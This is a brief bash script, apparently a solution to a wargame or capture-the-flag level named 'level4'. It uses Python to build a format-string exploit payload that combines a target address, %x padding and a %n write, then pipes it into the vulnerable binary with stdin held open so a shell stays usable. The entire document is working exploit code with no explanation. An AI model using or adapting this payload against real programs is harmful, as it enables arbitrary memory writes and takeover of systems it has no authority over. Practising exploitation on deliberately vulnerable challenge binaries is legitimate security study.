#!/usr/bin/env bash

python -c 'print "\x10\x98\x04\x08" + "%10x"*10 + "%16930012x" + "%n"' > exploit
cat exploit - | ./level4
